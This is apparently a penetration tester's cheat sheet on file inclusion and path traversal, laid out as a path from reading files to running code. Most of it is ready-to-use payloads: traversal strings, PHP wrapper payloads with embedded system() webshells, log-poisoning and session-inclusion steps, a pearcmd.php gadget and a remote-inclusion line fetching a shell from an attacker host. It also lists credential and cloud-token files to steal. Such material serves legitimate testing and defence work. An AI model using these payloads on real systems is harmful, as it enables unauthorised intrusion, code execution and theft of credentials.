# Moraa — LFI / RFI / path traversal → file read → RCE

> HackTricks `file-inclusion`. Cross-ref [[rce-scenarios]], [[ssrf]] (RFI/wrappers→SSRF), [[file-upload]] (upload+LFI→RCE).

## Detect
Params: `?file= page= include= path= dir= doc= template= view= lang= download= content=`. Baseline
with a known file, then traverse. First read → then escalate to RCE.
```
../../../../etc/passwd            /etc/passwd (absolute)         C:\windows\win.ini
....//....//etc/passwd            # non-recursive ../ stripping
..%2f..%2f..%2fetc/passwd         %252f (double)   ..%c0%af (unicode overlong)
%2e%2e%2f...                      /var/www/../../etc/passwd  (keep base context)
../../etc/passwd%00               # null byte (PHP<5.3)
```
Windows: swap `/`→`\`, target `C:\inetpub\wwwroot\web.config`, `C:\windows\win.ini`.

## PHP wrappers (read source & get RCE without a file on disk)
```
php://filter/convert.base64-encode/resource=index.php        # read PHP SOURCE (base64)
php://filter/zlib.deflate|convert.base64-encode/resource=x    # chained
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ # data:// = RCE if allow_url_include
php://input  (POST body: <?php system($_GET['c']);?>)         # RCE via body
expect://id                                                    # RCE if expect ext loaded
zip://upload.jpg%23shell.php   phar://x.phar                   # archive/deser
```
**php://filter LFI→RCE (no upload):** chain `convert.iconv.*` filters to synthesize arbitrary PHP
bytes from the filter output (php_filter_chain_generator.py) — turns pure file-read into code exec.

## LFI → RCE paths
| Path | How |
|---|---|
| **Log poisoning** | inject `<?php system($_GET['c']);?>` via User-Agent/param → include `/var/log/{apache2,nginx}/access.log`. Single quotes only. |
| **Session inclusion** | write payload into a session var, include `/var/lib/php/sess_<PHPSESSID>` |
| `/proc/self/environ` | inject via User-Agent, include it |
| `/proc/self/fd/N` | brute FD numbers to hit an uploaded/tmp file |
| **phpinfo + file_uploads** | read phpinfo → find tmp path → include before deletion (race) |
| **pearcmd.php gadget** | `?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/x.php` |
| **tmp race** | upload → segfault before cleanup → brute `/tmp/php*` |

## RFI (rarer — needs allow_url_include=On)
`?page=http://attacker/shell.txt` · `\\attacker\share\shell.php` (Windows SMB).

## Impact
Read: `/etc/passwd`, app config/`.env` (DB creds, API keys), `/proc/self/environ`, cloud creds
(`~/.aws/credentials`, `/var/run/secrets/kubernetes.io/serviceaccount/token`), SSH keys, source code.
Then chain to RCE via the table above. A pure arbitrary-file-read is already High (config/creds); RCE
is Critical. Tool: `ffuf/wfuzz -w LFI-Jhaddix.txt`, `LFISuite`.
